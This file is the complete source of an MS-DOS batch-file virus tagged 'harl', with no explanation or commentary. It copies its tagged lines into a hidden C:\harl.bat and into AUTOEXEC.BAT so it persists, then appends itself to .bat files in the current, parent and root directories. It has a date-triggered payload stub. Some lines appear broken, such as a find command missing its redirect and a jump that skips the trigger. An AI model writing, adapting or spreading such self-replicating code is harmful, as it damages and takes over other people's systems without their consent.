%[harl_A]% 
@echo off%[harl]% 
if '%1=='V goto harlvir 
if '%1=='I goto harlInf 
if exist C:\harl.bat goto harlbus 
if not exist %0.bat goto harlfin 
find /i "harl"<%0.bat>>C:\harl.bat 
attrib C:\harl.bat +h 
find /i "harl"nul 
if not errorlevel 1 goto harlfin 
set harl_P="harl_A" 
find /i %harl_P%>C:\AUTOEXEC.BAT 
set harl_P= 
goto harlfin 
echo.%harl_A%|date|find "22">nul 
if not errorlevel 1 call c:\harl.bat V%harl_A% 
:harlInf 
find /i "harl"<%2>nul 
if not errorlevel 1 goto harlfin 
type C:\harl.bat>>%2 
goto harlfin 
:harlvir 
REM [Write here something interesting] 
goto harlfin 
:harlbus 
for %%f in (.\*.bat ..\*.bat C:\*.bat) do call c:\harl.bat I %%f 
goto harlfin 
:harlfin
